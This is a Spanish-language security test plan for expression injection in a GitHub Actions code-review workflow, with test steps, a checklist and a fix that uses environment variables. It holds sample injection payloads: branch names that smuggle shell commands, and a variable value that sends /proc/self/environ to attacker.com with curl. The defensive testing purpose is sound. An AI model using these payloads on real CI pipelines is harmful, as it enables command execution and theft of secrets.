# SECURITY TEST — D2: GitHub Actions Expression Injection

## Descripción

Verificar si los valores del GitHub context usados directamente en `run:` steps
permiten inyectar comandos de shell arbitrarios.

## Vector Vulnerable

El workflow usa expresiones `${{ }}` dentro de bloques `run:` sin sanitizar:

```yaml
# kiro-code-review.yml — Step "Get PR diff"
run: |
  git fetch origin ${{ github.event.pull_request.base.ref }}
```

Si `base.ref` contiene caracteres especiales de shell, se ejecutarían comandos arbitrarios.

## Nivel de Riesgo

**Probabilidad real: Baja** — GitHub sanitiza automáticamente muchos valores del context
antes de inyectarlos en `run:`. El nombre de una rama en GitHub tiene restricciones de
formato. Sin embargo, es una práctica de seguridad documentada por GitHub que debe
verificarse explícitamente.

Referencia oficial: [GitHub Docs — Security hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)

---

## Cómo Probar

### Prueba 1 — Límites del nombre de rama en GitHub

Verificar qué caracteres permite GitHub en nombres de rama:

```bash
# Estos DEBERÍAN fallar al crear la rama en GitHub
git checkout -b "main; echo INJECTED"
git checkout -b "main\$(curl https://attacker.com)"
git checkout -b "main\`id\`"

# Intentar via API
curl -X POST \
  -H "Authorization: Bearer $GH_TOKEN" \
  -H "Accept: application/vnd.github+json" \
  https://api.github.com/repos/OWNER/REPO/git/refs \
  -d '{"ref":"refs/heads/main; echo INJECTED","sha":"SHA_AQUI"}'
```

**Resultado esperado:** GitHub rechaza la creación con `422 Unprocessable Entity`.

### Prueba 2 — Variable de repo `KIRO_REVIEW_MAX_FILES` como vector

```yaml
# El workflow usa:
MAX_FILES="${{ vars.KIRO_REVIEW_MAX_FILES }}"
MAX_FILES="${MAX_FILES:-100}"
if [ "$FILE_COUNT" -gt "$MAX_FILES" ]; then
```

Si un atacante con permiso `variables:write` puede modificar `KIRO_REVIEW_MAX_FILES`:

```bash
# Payload como valor de la variable (via Settings → Secrets and variables → Actions)
# Valor: 100; curl -X POST https://attacker.com -d "$(cat /proc/self/environ)"
```

**Cómo verificar permisos de variables:**

```bash
# ¿Qué roles pueden modificar variables del repo?
# Settings → Environments → protection rules
# Settings → Actions → General → Variables
# Solo Admin/Maintainer pueden modificar variables — pero vale confirmarlo
```

### Prueba 3 — Verificar sanitización de GitHub en la práctica

El método seguro recomendado por GitHub es usar variables de entorno intermedias:

```yaml
# ❌ Vulnerable (interpolación directa):
run: git fetch origin ${{ github.event.pull_request.base.ref }}

# ✅ Seguro (variable de entorno):
env:
  BASE_REF: ${{ github.event.pull_request.base.ref }}
run: git fetch origin "$BASE_REF"
```

**Verificar en el workflow actual** si el step `Get PR diff` usa interpolación directa
o variables de entorno. Si usa interpolación directa, crear un issue para corregirlo
aunque la explotación práctica sea difícil.

---

## Checklist de Verificación

- [ ] ¿GitHub rechaza nombres de rama con `;`, `$()`, `` ` ``?
- [ ] ¿El workflow usa `${{ }}` directamente en `run:` sin variable intermediaria?
- [ ] ¿Quién tiene permiso de modificar variables del repo (`KIRO_REVIEW_MAX_FILES`)?
- [ ] ¿El valor de `KIRO_REVIEW_MAX_FILES` es validado como número antes de usarse?

---

## Fix Recomendado

```yaml
# En kiro-code-review.yml, cambiar:
- name: Get PR diff
  run: |
    git fetch origin ${{ github.event.pull_request.base.ref }}

# Por:
- name: Get PR diff
  env:
    BASE_REF: ${{ github.event.pull_request.base.ref }}
    HEAD_REF: ${{ github.event.pull_request.head.ref }}
  run: |
    git fetch origin "$BASE_REF"
    git diff "origin/$BASE_REF"...HEAD --name-only > changed_files.txt
    git diff "origin/$BASE_REF"...HEAD > full_diff.patch
```

---

## Resultado Esperado (PASS)

- GitHub rechaza la creación de ramas con caracteres de shell injection
- El workflow usa variables de entorno como intermediario (o GitHub mitiga la inyección)
- `KIRO_REVIEW_MAX_FILES` solo puede ser modificado por Admins

## Señal de Vulnerabilidad (FAIL)

- Se puede crear una rama con `;` o `$()` en el nombre
- El step ejecuta comandos no esperados
- El log del runner muestra output de comandos inyectados
